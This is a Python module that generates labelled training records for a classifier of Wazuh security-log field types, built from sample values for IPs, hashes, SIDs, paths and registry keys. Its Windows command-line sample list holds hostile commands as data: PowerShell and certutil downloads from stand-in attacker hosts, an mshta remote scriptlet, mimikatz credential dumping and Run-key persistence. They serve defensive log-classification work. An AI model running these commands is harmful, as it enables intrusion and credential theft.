"""Bootstrap training data for per-source classifiers.

Generates labelled TrainingRecord instances by running real sample
values through extract_features(). No synthetic vectors -- feature
extraction is always live so bootstrap data stays consistent with
whatever extract_features() produces at runtime.

Wazuh ground truth derived from discovery runs 9-15 (session_005) plus
corrections confirmed in run_20260223_095449 (session_007):
  - full_log / agent.name / predecoder.hostname (heuristic error fixes)
  - syscheck.gid_after / syscheck.uid_after / data.win.system.providerGuid
  - data.win.eventdata.* family (users, SIDs, processes, cmdlines, logon types)
  - syscheck.* paths, permissions, registry paths
  - rule.mitre.* (id, tactic sub-fields)

Additional sources added here as they are validated.

Usage:
    records = BootstrapData.for_source("wazuh")
    classifier.train(records)
"""

from __future__ import annotations

import logging
from typing import Callable

from grasp.classifier.base import TrainingRecord
from grasp.discovery.features import extract_features

logger = logging.getLogger("grasp.classifier.training")

_BootstrapFn = Callable[[], list[TrainingRecord]]


def _make_record(
    source_id: str,
    field_path: str,
    label: str,
    values: list[str],
) -> TrainingRecord:
    """Extract features from values and wrap as a TrainingRecord."""
    feat = extract_features(field_path, values)
    return TrainingRecord(
        feature_vector=feat.vector,
        label=label,
        source_id=source_id,
        field_path=field_path,
    )


# ---------------------------------------------------------------------------
# Wazuh bootstrap
# ---------------------------------------------------------------------------

def _wazuh_bootstrap() -> list[TrainingRecord]:
    """Labelled training records derived from Wazuh-ES telemetry.

    Field patterns and correct labels from session_005 ground truth table
    plus session_007 confirmed corrections and family expansions.
    Sample values are representative -- sufficient variety for feature
    vectors to capture the statistical fingerprint of each field type.

    Note on agent.name / predecoder.hostname: low-cardinality in small
    lab environments (3-5 machines) causes the heuristic to route these
    to enum. Bootstrap overrides with production-representative FQDNs so
    the classifier learns entity regardless of cardinality.
    """
    src = "wazuh"
    records: list[TrainingRecord] = []

    # ------------------------------------------------------------------
    # ENTITY: IPv4 addresses
    # ------------------------------------------------------------------
    ipv4_samples = [
        "192.168.1.10", "10.0.0.5", "172.16.0.20", "192.168.100.1",
        "10.10.10.10", "192.168.2.50", "172.31.255.1", "10.0.1.100",
        "192.168.0.254", "8.8.8.8",
    ]
    for path in ("agent.ip", "data.srcip", "data.dstip"):
        records.append(_make_record(src, path, "entity", ipv4_samples))

    # ------------------------------------------------------------------
    # ENTITY: MD5 hashes
    # ------------------------------------------------------------------
    md5_samples = [
        "d41d8cd98f00b204e9800998ecf8427e",
        "5d41402abc4b2a76b9719d911017c592",
        "e99a18c428cb38d5f260853678922e03",
        "098f6bcd4621d373cade4e832627b4f6",
        "0cc175b9c0f1b6a831c399e269772661",
        "8277e0910d750195b448797616e091ad",
        "e4da3b7fbbce2345d7772b0674a318d5",
        "1679091c5a880faf6fb5e6087eb1b2dc",
        "8fa14cdd754f91cc6554c9e71929cce7",
        "c4ca4238a0b923820dcc509a6f75849b",
    ]
    for path in ("syscheck.md5_after", "syscheck.md5_before"):
        records.append(_make_record(src, path, "entity", md5_samples))

    # ------------------------------------------------------------------
    # ENTITY: SHA1 hashes
    # ------------------------------------------------------------------
    sha1_samples = [
        "da39a3ee5e6b4b0d3255bfef95601890afd80709",
        "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d",
        "9e32295f8225803bb6d5fbe7d19e17d8400e76b",
        "0ade7c2cf97f75d009975f4d720d1fa6c19f4897",
        "86f7e437faa5a7fce15d1ddcb9eaeaea377667b8",
        "e9d71f5ee7c92d6dc9e92ffdad17b8bd49418f98",
        "84a516841ba77a5b4648de2cd0dfcb30ea46dbb4",
        "a9993e364706816aba3e25717850c26c9cd0d89d",
        "c0854fb9fb03c41cce3802cb0d220529e6eef94e",
        "3bc15c8aae3e4124dd409035f32ea2fd6835efc9",
    ]
    for path in ("syscheck.sha1_after", "syscheck.sha1_before"):
        records.append(_make_record(src, path, "entity", sha1_samples))

    # ------------------------------------------------------------------
    # ENTITY: SHA256 hashes
    # ------------------------------------------------------------------
    sha256_samples = [
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824",
        "b94d27b9934d3e08a52e52d7da7dabfac484efe04294e576f4d5d143d3f54d9d",
        "f1d3ff8443297732862df21dc4e57262ef30e6ee07b4e2e5e3d76d7d2bed4c6",
        "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
        "aec070645fe53ee3b3763059376134f058cc337247c978add178b6ccdfb0019f",
        "559aead08264d5795d3909718cdd05abd49572e84fe55590eef31a88a08fdffd",
        "df7e70e5021544f4834bbee64a9e3789febc4be81470df629cad6ddb03320a5c",
        "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4d",
        "d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35",
    ]
    for path in ("syscheck.sha256_after", "syscheck.sha256_before"):
        records.append(_make_record(src, path, "entity", sha256_samples))

    # ------------------------------------------------------------------
    # ENTITY: MITRE technique IDs  (rule.mitre_techniques leaf)
    # ------------------------------------------------------------------
    technique_samples = [
        "T1059", "T1078", "T1055", "T1003", "T1021",
        "T1566", "T1190", "T1133", "T1505", "T1053",
    ]
    records.append(_make_record(
        src, "rule.mitre_techniques", "entity", technique_samples,
    ))

    # ENTITY: MITRE sub-field paths seen in Wazuh telemetry
    # rule.mitre.id.N  -- ATT&CK technique ID strings
    mitre_id_samples = [
        "T1059.001", "T1078.003", "T1055.012", "T1003.001", "T1021.002",
        "T1566.001", "T1190", "T1133", "T1505.003", "T1053.005",
    ]
    for path in ("rule.mitre.id", "rule.mitre.id.0", "rule.mitre.id.1"):
        records.append(_make_record(src, path, "entity", mitre_id_samples))

    # ENUM: MITRE tactic names
    mitre_tactic_samples = [
        "initial-access", "execution", "persistence", "privilege-escalation",
        "defense-evasion", "credential-access", "discovery",
        "lateral-movement", "collection", "exfiltration",
    ]
    for path in (
        "rule.mitre.tactic",
        "rule.mitre.tactic.0",
        "rule.mitre.tactic.1",
    ):
        records.append(_make_record(src, path, "enum", mitre_tactic_samples))

    # ------------------------------------------------------------------
    # ENTITY: FQDNs / hostnames
    # Session 007 correction: heuristic routed these to enum due to low
    # cardinality in lab (3-5 machines). Use prod-representative samples.
    # ------------------------------------------------------------------
    fqdn_samples = [
        "server01.corp.local", "web02.internal.example.com",
        "db01.prod.corp", "proxy03.dmz.local",
        "mail01.example.com", "app04.staging.corp",
        "cache02.internal.local", "lb01.prod.example.com",
        "wazuh-manager.corp.local", "agent01.endpoint.corp",
    ]
    for path in ("agent.name", "predecoder.hostname"):
        records.append(_make_record(src, path, "entity", fqdn_samples))

    # ------------------------------------------------------------------
    # TEMPORAL: ISO timestamps
    # ------------------------------------------------------------------
    timestamp_samples = [
        "2026-01-15T10:30:00Z", "2026-01-15T11:45:22Z",
        "2026-01-16T08:00:15Z", "2026-01-16T09:12:33Z",
        "2026-01-17T14:55:01Z", "2026-01-17T16:20:45Z",
        "2026-01-18T07:30:00Z", "2026-01-18T22:15:10Z",
        "2026-02-01T00:00:00Z", "2026-02-10T13:45:59Z",
    ]
    for path in ("@timestamp", "data.win.system.systemTime"):
        records.append(_make_record(src, path, "temporal", timestamp_samples))

    # ------------------------------------------------------------------
    # METRIC: Rule levels (small integers)
    # ------------------------------------------------------------------
    rule_level_samples = [
        "3", "5", "7", "3", "12", "5", "3", "7", "10", "2",
    ]
    records.append(_make_record(
        src, "rule.level", "metric", rule_level_samples,
    ))

    # METRIC: Windows event IDs
    event_id_samples = [
        "4624", "4625", "4648", "4672", "4688",
        "4698", "4702", "4720", "4728", "4776",
    ]
    records.append(_make_record(
        src, "data.win.system.eventID", "metric", event_id_samples,
    ))

    # METRIC: Windows system numeric fields
    win_numeric_samples = [
        "0", "1", "2", "4", "8", "16", "32", "64", "128", "256",
    ]
    for path in (
        "data.win.system.level",
        "data.win.system.opcode",
        "data.win.system.task",
        "data.win.system.version",
        "data.win.system.processID",
        "data.win.system.threadID",
        "data.win.system.eventRecordID",
    ):
        records.append(_make_record(src, path, "metric", win_numeric_samples))

    # ------------------------------------------------------------------
    # ENUM: Rule groups (low-cardinality categories)
    # ------------------------------------------------------------------
    rule_group_samples = [
        "authentication_success", "authentication_failed",
        "syscheck", "rootcheck", "web",
        "windows", "linux", "ossec",
        "ids", "firewall",
    ]
    records.append(_make_record(
        src, "rule.groups", "enum", rule_group_samples,
    ))

    # ENUM: Decoder names
    decoder_samples = [
        "windows", "syslog", "ossec", "web-accesslog",
        "iptables", "sshd", "sudo", "auditd",
        "windows-eventchannel", "json",
    ]
    records.append(_make_record(
        src, "decoder.name", "enum", decoder_samples,
    ))

    # ENUM: Windows channel / severity / logon type
    win_channel_samples = [
        "Security", "System", "Application", "Microsoft-Windows-Sysmon/Operational",
        "Microsoft-Windows-PowerShell/Operational", "Setup",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Microsoft-Windows-WMI-Activity/Operational",
        "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
        "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall",
    ]
    records.append(_make_record(
        src, "data.win.system.channel", "enum", win_channel_samples,
    ))

    win_severity_samples = [
        "AUDIT_SUCCESS", "AUDIT_FAILURE", "INFORMATION",
        "WARNING", "ERROR", "CRITICAL",
        "AUDIT_SUCCESS", "INFORMATION", "WARNING", "ERROR",
    ]
    records.append(_make_record(
        src, "data.win.system.severityValue", "enum", win_severity_samples,
    ))

    win_logon_type_samples = [
        "2", "3", "4", "5", "7", "8", "9", "10", "11", "3",
    ]
    records.append(_make_record(
        src, "data.win.eventdata.logonType", "metric", win_logon_type_samples,
    ))

    # ------------------------------------------------------------------
    # TEXT: Long descriptive messages
    # Session 007 correction: heuristic scored full_log as entity due to
    # long string length triggering entity score. Bootstrap overrides.
    # ------------------------------------------------------------------
    text_samples = [
        "File integrity checksum changed on monitored file",
        "Multiple authentication failures detected from remote host",
        "New user account created on the system by administrator",
        "Firewall rule modified by privileged user account",
        "SSH session opened from previously unseen remote address",
        "Package installation detected on monitored endpoint system",
        "Service configuration changed outside of maintenance window",
        "Unusual process execution detected with elevated privileges",
        "Registry key modification detected in sensitive system path",
        "Network connection attempt to known malicious IP address",
    ]
    for path in ("full_log", "data.win.system.message"):
        records.append(_make_record(src, path, "text", text_samples))

    # TEXT: Windows eventdata message fields (long free-form content)
    win_text_samples = [
        "An account was successfully logged on. Subject: Security ID: SYSTEM",
        "A new process has been created. Creator Subject: Security ID: S-1-5-18",
        "Special privileges assigned to new logon. Subject: Security ID: S-1-5-18",
        "The Windows Filtering Platform has blocked a connection.",
        "An attempt was made to access an object. Object: Object Server: Security",
        "Audit Policy Change: Audit Policy Change: Success and Failure",
        "A user account was changed. Subject: Security ID: S-1-5-21-domain",
        "Object Access: File System. Object Name: C:\\Windows\\System32\\cmd.exe",
        "Process Termination. Subject: Security ID: S-1-5-18 Account Name: SYSTEM",
        "Network Policy Server denied access to a user.",
    ]
    records.append(_make_record(
        src, "data.win.eventdata.param1", "text", win_text_samples,
    ))

    # ------------------------------------------------------------------
    # ENTITY: Windows eventdata user / account identifiers
    # ------------------------------------------------------------------
    win_username_samples = [
        "SYSTEM", "Administrator", "john.doe", "svc_backup",
        "jane.smith", "svc_sql", "helpdesk01", "domain\\admin",
        "bob.jones", "svc_monitor",
    ]
    for path in (
        "data.win.eventdata.subjectUserName",
        "data.win.eventdata.targetUserName",
        "data.win.eventdata.samAccountName",
    ):
        records.append(_make_record(src, path, "entity", win_username_samples))

    # ENTITY: Windows SIDs
    win_sid_samples = [
        "S-1-5-18", "S-1-5-19", "S-1-5-20",
        "S-1-5-21-3623811015-3361044348-30300820-1013",
        "S-1-5-21-3623811015-3361044348-30300820-500",
        "S-1-5-21-1234567890-0987654321-1122334455-1001",
        "S-1-5-32-544", "S-1-5-32-545", "S-1-5-32-548", "S-1-5-32-550",
    ]
    for path in (
        "data.win.eventdata.subjectUserSid",
        "data.win.eventdata.targetUserSid",
        "data.win.eventdata.memberSid",
    ):
        records.append(_make_record(src, path, "entity", win_sid_samples))

    # ENTITY: Windows domain names
    win_domain_samples = [
        "CORP", "WORKGROUP", "EXAMPLE", "CONTOSO",
        "CORP.LOCAL", "INTERNAL", "DMZ", "PROD",
        "NT AUTHORITY", "BUILTIN",
    ]
    for path in (
        "data.win.eventdata.subjectDomainName",
        "data.win.eventdata.targetDomainName",
    ):
        records.append(_make_record(src, path, "entity", win_domain_samples))

    # ENTITY: Windows process / image paths
    win_process_samples = [
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe",
        "C:\\Windows\\explorer.exe",
        "C:\\Windows\\System32\\lsass.exe",
        "C:\\Windows\\System32\\services.exe",
        "C:\\Users\\john.doe\\AppData\\Local\\Temp\\malware.exe",
        "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
        "C:\\Windows\\System32\\rundll32.exe",
    ]
    for path in (
        "data.win.eventdata.newProcessName",
        "data.win.eventdata.parentProcessName",
        "data.win.eventdata.imagePath",
    ):
        records.append(_make_record(src, path, "entity", win_process_samples))

    # TEXT: Windows command line arguments (long, variable)
    win_cmdline_samples = [
        "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
        "cmd.exe /c net user administrator Password123! /domain",
        "schtasks /create /tn MyTask /tr C:\\Windows\\System32\\cmd.exe /sc daily",
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\malware.exe",
        "wmic process call create 'powershell -w hidden -c ...'",
        "net localgroup administrators hacker /add",
        "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        "certutil -urlcache -split -f http://attacker.com/payload payload.exe",
        "rundll32.exe C:\\Users\\Temp\\malicious.dll,DllMain",
        "mshta.exe javascript:a=(GetObject('script:http://attacker.com/xss.sct')).Exec();close();",
    ]
    for path in (
        "data.win.eventdata.commandLine",
        "data.win.eventdata.parentCommandLine",
    ):
        records.append(_make_record(src, path, "text", win_cmdline_samples))

    # ENUM: Windows eventdata low-cardinality flags
    win_bool_samples = [
        "true", "false", "true", "false", "true",
        "false", "true", "false", "true", "false",
    ]
    for path in (
        "data.win.eventdata.mandatoryLabel",
        "data.win.eventdata.virtualAccount",
        "data.win.eventdata.elevatedToken",
        "data.win.eventdata.restrictedAdminMode",
    ):
        records.append(_make_record(src, path, "enum", win_bool_samples))

    # ENTITY: Windows provider GUIDs
    # Session 007 correction: low cardinality in sample routed to enum.
    # UUIDs are entities regardless of cardinality.
    guid_samples = [
        "{0d4fdc09-8c27-494a-bda0-505e4fd8adae}",
        "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}",
        "{54849625-5478-4994-a5ba-3e3b0328c30d}",
        "{f0558438-0000-1000-8000-00aa002986e6}",
        "{b0aa8734-56f7-41cc-b2f4-de228e98360d}",
        "{a68ca8b7-004f-d7b6-a698-07e2de0f1f5d}",
        "{ddaf10c4-e000-0000-0000-000000000000}",
        "{14d8f4f2-9f3d-4c8e-a9bc-f3b9f5c28f8e}",
        "{eef065d2-e855-4e64-bd78-c4a49a96e8e1}",
        "{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}",
    ]
    for path in (
        "data.win.system.providerGuid",
        "data.win.eventdata.processGuid",
        "data.win.eventdata.parentProcessGuid",
    ):
        records.append(_make_record(src, path, "entity", guid_samples))

    # ENTITY: Windows provider names (software component identifiers)
    win_provider_samples = [
        "Microsoft-Windows-Security-Auditing",
        "Microsoft-Windows-Sysmon",
        "Microsoft-Windows-PowerShell",
        "Microsoft-Windows-TaskScheduler",
        "Microsoft-Windows-WMI-Activity",
        "Microsoft-Windows-TerminalServices-LocalSessionManager",
        "Microsoft-Windows-Windows Firewall With Advanced Security",
        "Microsoft-Windows-Kernel-Process",
        "Microsoft-Windows-Eventlog",
        "Microsoft-Antimalware-Protection",
    ]
    records.append(_make_record(
        src, "data.win.system.providerName", "entity", win_provider_samples,
    ))

    # METRIC: Windows network port numbers in eventdata
    win_port_samples = [
        "80", "443", "445", "3389", "22",
        "8080", "1433", "3306", "5985", "5986",
    ]
    for path in (
        "data.win.eventdata.destinationPort",
        "data.win.eventdata.sourcePort",
    ):
        records.append(_make_record(src, path, "metric", win_port_samples))

    # ENTITY: Windows network addresses in eventdata
    for path in (
        "data.win.eventdata.destinationIp",
        "data.win.eventdata.sourceIp",
        "data.win.eventdata.ipAddress",
    ):
        records.append(_make_record(src, path, "entity", ipv4_samples))

    # ------------------------------------------------------------------
    # ENTITY: syscheck file paths
    # ------------------------------------------------------------------
    syscheck_path_samples = [
        "/etc/passwd", "/etc/shadow", "/etc/sudoers",
        "/usr/bin/sudo", "/usr/lib/libssl.so.1.1",
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\lsass.exe",
        "/bin/bash", "/sbin/init",
        "C:\\Program Files\\important_app\\config.ini",
    ]
    for path in (
        "syscheck.path",
        "syscheck.path_after",
        "syscheck.path_before",
    ):
        records.append(_make_record(src, path, "entity", syscheck_path_samples))

    # ENTITY: syscheck UID/GID and Windows SIDs
    # Session 007 correction: mixed Linux integers and Windows SIDs.
    # Correct label is entity -- UID/GID/SID are all identity anchors.
    # Values span both formats since this field appears in cross-platform
    # deployments.
    uid_gid_samples = [
        "0", "33", "103", "900", "988",
        "S-1-5-18", "S-1-5-32-544",
        "1000", "1001", "S-1-5-21-3623811015-1013",
    ]
    for path in (
        "syscheck.uid_after",
        "syscheck.uid_before",
        "syscheck.gid_after",
        "syscheck.gid_before",
    ):
        records.append(_make_record(src, path, "entity", uid_gid_samples))

    # ENTITY: syscheck user/group name strings
    syscheck_uname_samples = [
        "root", "www-data", "nobody", "daemon", "syslog",
        "SYSTEM", "Administrators", "Users", "NetworkService", "LocalService",
    ]
    for path in (
        "syscheck.uname_after",
        "syscheck.uname_before",
        "syscheck.gname_after",
        "syscheck.gname_before",
    ):
        records.append(_make_record(src, path, "entity", syscheck_uname_samples))

    # METRIC: syscheck file permissions (octal strings and Windows ACLs)
    syscheck_perm_samples = [
        "0644", "0755", "0600", "0640", "0750",
        "0777", "0400", "0440", "0664", "0700",
    ]
    for path in ("syscheck.perm_after", "syscheck.perm_before"):
        records.append(_make_record(src, path, "metric", syscheck_perm_samples))

    # ENUM: syscheck event types and architecture
    syscheck_arch_samples = [
        "[x32]", "[x64]", "[x32]", "[x64]", "[x32]",
        "[x64]", "[x32]", "[x64]", "[x32]", "[x64]",
    ]
    records.append(_make_record(
        src, "syscheck.arch", "enum", syscheck_arch_samples,
    ))

    syscheck_event_samples = [
        "added", "modified", "deleted", "modified", "added",
        "deleted", "modified", "added", "modified", "deleted",
    ]
    records.append(_make_record(
        src, "syscheck.event", "enum", syscheck_event_samples,
    ))

    # METRIC: syscheck file size (bytes)
    syscheck_size_samples = [
        "1024", "4096", "65536", "102400", "8192",
        "512", "204800", "16384", "32768", "2048",
    ]
    for path in ("syscheck.size_after", "syscheck.size_before"):
        records.append(_make_record(src, path, "metric", syscheck_size_samples))

    # ENTITY: syscheck Windows registry paths
    syscheck_reg_samples = [
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services",
        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender",
        "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Word\\Security",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate",
        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies",
    ]
    for path in (
        "syscheck.path",
    ):
        # registry paths share the syscheck.path field -- already registered above
        # add explicit registry sub-paths seen in Windows deployments
        pass
    for path in (
        "syscheck.value_name",
        "syscheck.tag",
    ):
        records.append(_make_record(src, path, "entity", syscheck_reg_samples))

    logger.info(
        "Wazuh bootstrap: %d training records generated", len(records),
    )
    return records


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------

_REGISTRY: dict[str, _BootstrapFn] = {
    "wazuh": _wazuh_bootstrap,
}


class BootstrapData:
    """Factory for per-source bootstrap training records.

    New sources register a bootstrap function in _REGISTRY.
    Calling for_source() on an unregistered source returns an
    empty list -- the classifier starts cold and learns from corrections.
    """

    @staticmethod
    def for_source(source_id: str) -> list[TrainingRecord]:
        """Return bootstrap training records for the given source.

        Args:
            source_id: Source identifier (e.g. 'wazuh', 'suricata').

        Returns:
            List of TrainingRecord instances, empty if source unknown.
        """
        fn = _REGISTRY.get(source_id)
        if fn is None:
            logger.info(
                "No bootstrap data for source '%s' -- cold start", source_id,
            )
            return []
        return fn()

    @staticmethod
    def registered_sources() -> list[str]:
        """Return list of source IDs that have bootstrap data."""
        return list(_REGISTRY.keys())